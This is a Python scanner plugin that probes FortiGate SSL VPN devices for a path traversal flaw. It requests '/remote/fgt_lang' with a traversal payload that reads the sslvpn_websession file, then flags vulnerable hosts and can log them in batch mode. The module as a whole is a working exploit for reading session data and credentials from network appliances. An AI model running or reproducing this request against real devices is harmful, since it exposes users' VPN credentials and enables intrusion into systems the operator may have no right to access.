#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()


class FortigateIndoScan:

    def run(self, urls):
        url = urls + '/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'
        # print(head)
        try:
            response = requests.get(url, headers=self.headers,verify=self.ssl, timeout=5, proxies=self.proxy)
            if "fgt_lang =" in response.text:
                OutPrintInfo("Fortigate", f'存在Fortigate敏感信息泄漏{url}')
                if self.batch:
                    OutPutFile("fortigate_info.txt",f'存在Fortigate敏感信息泄漏{url}')
            else:
                if not self.batch:
                    OutPrintInfo("Fortigate", '不存在Fortigate敏感信息泄漏')

        except Exception:
            if not self.batch:
                OutPrintInfo("Fortigate", '目标请求出错')

    def main(self, target):
        self.batch = target["batch_work"]

        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Fortigate", '开始执行Fortigate敏感信息泄漏检测')
        self.run(url)
        if not self.batch:
            OutPrintInfo("Fortigate", 'Fortigate敏感信息泄漏执行结束')
